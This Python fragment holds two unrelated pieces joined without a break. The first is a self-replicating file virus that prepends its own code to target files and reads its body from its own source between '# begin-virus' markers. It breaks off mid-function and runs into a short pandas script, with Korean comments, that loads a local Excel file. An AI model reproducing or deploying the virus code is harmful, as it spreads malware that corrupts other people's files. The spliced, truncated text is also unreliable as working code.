# begin-virus
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):
        with open(file, "w", encoding='utf-8') as infected_file:
            infected_file.write("# begin-virus\n")
            infected_file.write(virus_code)
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus" in line:
import pandas as pd

# 엑셀 파일 경로 지정
file_path = 'C:/Users/yb301/Desktop/231122.xlsx'

# 엑셀 파일 불러오기
df = pd.read_excel(file_path)
#df = pd.read_excel(file_path, engine='openpyxl')

# 데이터 확인
print(df.head())